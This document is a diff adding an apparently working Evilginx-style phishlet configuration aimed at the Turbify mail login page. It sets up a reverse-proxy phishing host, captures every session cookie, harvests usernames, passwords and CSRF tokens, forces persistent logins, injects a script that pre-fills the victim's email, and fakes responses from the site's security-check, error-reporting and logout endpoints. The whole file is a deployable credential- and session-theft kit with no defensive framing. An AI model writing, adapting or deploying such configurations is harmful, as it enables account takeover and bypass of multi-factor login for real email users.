@@ -1,0 +1,174 @@
+min_ver: "3.0.0"
+redirect_url: "https://mail.turbify.com/"
+
+proxy_hosts:
+  - {
+      phish_sub: "wmidentity",
+      orig_sub: "mail",
+      domain: "turbify.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "static",
+      orig_sub: "static",
+      domain: "turbify.com",
+      session: false,
+      auto_filter: true,
+    }
+
+sub_filters:
+  # Core Turbify domain replacements
+  - {
+      triggers_on: "mail.turbify.com",
+      orig_sub: "mail",
+      domain: "turbify.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "mail.turbify.com",
+      orig_sub: "",
+      domain: "turbify.com",
+      search: "{hostname}",
+      replace: "{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+
+  # Turbify static assets and CDN
+  - {
+      triggers_on: "mail.turbify.com",
+      orig_sub: "static",
+      domain: "turbify.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/css", "application/javascript", "image/*", "font/*"],
+    }
+
+  # CSRF token handling in JS
+  - {
+      triggers_on: "mail.turbify.com",
+      orig_sub: "mail",
+      domain: "turbify.com",
+      search: '"{hostname}"',
+      replace: '"{hostname}"',
+      mimes: ["application/javascript"],
+    }
+  - {
+      triggers_on: "mail.turbify.com",
+      orig_sub: "",
+      domain: "turbify.com",
+      search: 'turbify\.com',
+      replace: "turbify.com",
+      mimes: ["text/html", "application/javascript"],
+    }
+
+auth_tokens:
+  # Capture Turbify session cookies
+  - domain: ".turbify.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+  - domain: ".mail.turbify.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+
+credentials:
+  username:
+    key: "login|email"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "persistent"
+      search: "(.*)"
+      type: "post"
+    - key: "done"
+      search: "(.*)"
+      type: "post"
+    - key: "csrfToken"
+      search: "(.*)"
+      type: "post"
+    - key: "_csrf"
+      search: "(.*)"
+      type: "post"
+
+auth_urls:
+  - "/initiate"
+  - "/login"
+  - "/dashboard"
+  - "/mailbox"
+  - "/home"
+  - "/api/session"
+  - "/success"
+
+login:
+  domain: "mail.turbify.com"
+  path: "/login"
+
+force_post:
+  # Force persistent login session
+  - path: "/login"
+    search:
+      - { key: "login|email", search: ".*" }
+      - { key: "password", search: ".*" }
+    force:
+      - { key: "persistent", value: "persistent" }
+      - { key: "done", value: "" }
+    type: "post"
+
+js_inject:
+  # Pre-fill email and focus password
+  - trigger_domains: ["mail.turbify.com"]
+    trigger_paths: ["/login"]
+    trigger_params: ["username"]
+    script: |
+      function turbifyAutofill() {
+        var emailField = document.querySelector('input[name="login"], input[name="email"], input[id*="email"], input[placeholder*="email"]');
+        var passwordField = document.querySelector('input[name="password"], input[type="password"]');
+        
+        if (emailField && "{username}") {
+          emailField.value = "{username}";
+        }
+        
+        if (passwordField) {
+          passwordField.focus();
+          passwordField.select();
+        }
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', turbifyAutofill);
+      } else {
+        setTimeout(turbifyAutofill, 500);
+      }
+
+intercept:
+  # Block error reporting, security checks, and logout
+  - {
+      domain: "mail.turbify.com",
+      path: "^/log|report|error.*$",
+      http_status: 200,
+      body: "{}",
+      mime: "application/json",
+    }
+  - {
+      domain: "mail.turbify.com",
+      path: "^/api/security|check.*$",
+      http_status: 200,
+      body: '{"valid": true}',
+      mime: "application/json",
+    }
+  - {
+      domain: "mail.turbify.com",
+      path: "^/logout.*$",
+      http_status: 302,
+      body: "",
+      mime: "text/html",
+    }
